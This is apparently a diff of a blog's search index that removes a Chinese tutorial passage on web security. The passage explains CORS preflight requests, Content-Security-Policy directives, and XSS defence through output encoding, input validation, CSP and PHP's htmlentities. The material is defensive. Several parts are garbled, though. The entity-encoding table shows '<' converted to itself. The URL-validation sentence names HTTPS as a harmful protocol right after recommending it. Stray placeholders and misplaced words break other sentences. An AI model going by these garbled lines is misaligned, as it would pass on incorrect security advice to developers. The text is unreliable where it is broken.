-跨源资源共享标准新增了一组 HTTP 标头字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（例如 Cookie 和 HTTP 认证相关数据）。
-CSP(Content security policy)
-
-
-
-CSP 是一种浏览器安全机制，旨在缓解 XSS 和其他一些攻击。它的工作原理是限制页面可以加载的资源（例如脚本和图像），并限制页面是否可以被其他页面嵌入。
-要启用 CSP，响应需要包含一个名为 &lt;CSP_DIR&gt; 的 HTTP 响应头，Content-Security-Policy其值包含策略信息。策略本身由一个或多个指令组成，指令之间用分号分隔。
-Content-Security-Policy:    default-src &#x27;self&#x27;;    //所有未单独指定的资源，都只能从当前同源加载    script-src &#x27;self&#x27;;    //只允许加载本站 JavaScript    style-src &#x27;self&#x27;;    //只允许本站 CSS 样式    img-src &#x27;self&#x27;;    object-src &#x27;none&#x27;;    frame-ancestors &#x27;none&#x27;;    //禁止页面被任何 iframe/frame 嵌套    base-uri &#x27;self&#x27;;    //控制 &lt;base href=&quot;...&quot;&gt; 的来源    connect-src &#x27;self&#x27;;    //限制 AJAX / fetch / WebSocket 只能访问同源
-
-
-
-
-
-
-
-了解了上面的基础知识就可以更好的了解我们下面要讲的防护了
-跨站脚本攻击的防范通常可以通过两层防御来实现：
-
-对输出数据进行编码
-到达时验证输入
-
-对输出进行编码
-
-编码应该在将用户可控数据写入页面之前立即应用，因为写入的上下文决定了需要使用哪种编码。例如，JavaScript 字符串中的值需要与 HTML 上下文中的值不同的转义方式。
-在 HTML 环境中，您应该将未列入白名单的值转换为 HTML 实体：
-
-&lt;转换为：&lt;
-&gt;转换为：&gt;
-
-在 JavaScript 字符串上下文中，非字母数字值应该进行 Unicode 转义：
-
-&lt;转换为：\u003c
-&gt;转换为：\u003e
-
-有时您需要按正确的顺序应用多层编码。例如，要安全地将用户输入嵌入到事件处理程序中，您需要同时处理 JavaScript 上下文和 HTML 上下文。因此，您需要先对输入进行 Unicode 转义，然后再进行 HTML 编码：
-&lt;a href=&quot;#&quot; onclick=&quot;x=&#x27;This string needs two layers of escaping&#x27;&quot;&gt;test&lt;/a&gt;
-
-
-
-
-
-到达时验证
-
-编码可能是抵御 XSS 攻击最重要的防线，但它不足以在所有情况下都完全防止 XSS 漏洞。您还应该在首次收到用户输入时就尽可能严格地验证其有效性。
-输入验证示例包括：
-
-如果用户提交的 URL 将在响应中返回，请验证其是否以安全的协议（例如 HTTP 和 HTTPS）开头。否则，有人可能会使用有害协议（例如 HTTPS 或javascriptHTTPS）攻击您的网站data。
-如果用户提供的值预期为数值，则验证该值是否实际包含整数。
-验证输入是否仅包含预期的字符集。
-
-理想的输入验证方式应该是直接阻止无效输入。另一种尝试清除无效输入使其有效的方法更容易出错，应尽可能避免。
-CSP防xss
-
-内容安全策略 (CSP) 是抵御跨站脚本攻击的最后一道防线。如果您的 XSS 防护措施失效，您可以使用 CSP 通过限制攻击者的操作来缓解 XSS 攻击。
-CSP 允许您控制各种事项，例如是否允许加载外部脚本以及是否执行内联脚本。要部署 CSP，您需要在 HTTP 响应头中添加一个名为 &lt;header_name&gt; 的参数，Content-Security-Policy其值包含您的策略。
-以下是一个CSP示例：
-default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; frame-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;
-
-此策略规定，图片和脚本等资源只能从与主页相同的源加载。因此，即使攻击者成功注入了 XSS 有效载荷，他们也只能从当前源加载资源。这大大降低了攻击者利用 XSS 漏洞的可能性。
-如果您需要加载外部资源，请确保仅允许不会帮助攻击者利用您网站的脚本。例如，如果您将某些域名列入白名单，攻击者就可以加载来自这些域名的任何脚本。尽可能将资源托管在您自己的域名上。
-php中防xss
-
-PHP 中有一个名为 encode 的内置函数用于对实体进行编码htmlentities。在 HTML 上下文中，您应该调用此函数来转义输入。该函数应使用三个参数调用：
-
-您输入的字符串。
-ENT_QUOTES这是一个标志，用于指定所有引号都应该进行编码。
-字符集在大多数情况下应为 UTF-8。
-
-例如：
-&lt;?php echo htmlentities($input, ENT_QUOTES, &#x27;UTF-8&#x27;);?&gt;]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>xss</tag>
       </tags>
   </entry>
 </search>
